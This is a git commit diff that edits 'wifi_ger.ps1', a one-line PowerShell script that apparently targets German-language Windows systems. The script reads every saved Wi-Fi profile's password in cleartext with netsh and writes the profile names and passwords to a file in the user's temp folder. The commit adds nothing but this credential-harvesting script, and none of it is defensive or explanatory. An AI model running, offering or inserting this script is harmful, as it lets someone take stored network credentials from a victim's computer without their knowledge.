57df79fe2a38b559877e1a551df01b3da8844c19
Clown2331 <145130642+Clown2331@users.noreply.github.com>
2023-09-15 20:49:54 +0200

    Update wifi_ger.ps1

--- wifi_ger.ps1
+++ wifi_ger.ps1
@@ -1,6 +1,1 @@
-############################################################################################################################################################
-
-(netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Schlüsselinhalt\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize | Out-String > $env:TEMP/--wifi-passwords.txt
-
-############################################################################################################################################################
-
+netsh wlan show profiles | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Schlüsselinhalt\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize | Out-String > $env:TEMP/--wifi-passwords.txt
